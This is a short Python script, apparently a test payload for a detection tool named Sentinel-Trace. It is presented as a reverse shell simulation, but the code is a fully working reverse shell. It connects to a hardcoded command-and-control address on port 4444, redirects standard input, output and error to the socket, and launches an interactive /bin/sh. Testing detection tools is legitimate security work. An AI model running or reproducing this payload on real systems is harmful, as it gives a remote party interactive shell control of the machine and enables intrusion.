# Maelstrom-Breach Payload: Reverse Shell Simulation
# Purpose: Test Sentinel-Trace's process-network correlation.
import socket, subprocess, os

LHOST = "192.168.1.100" # Maelstrom C2 IP
LPORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])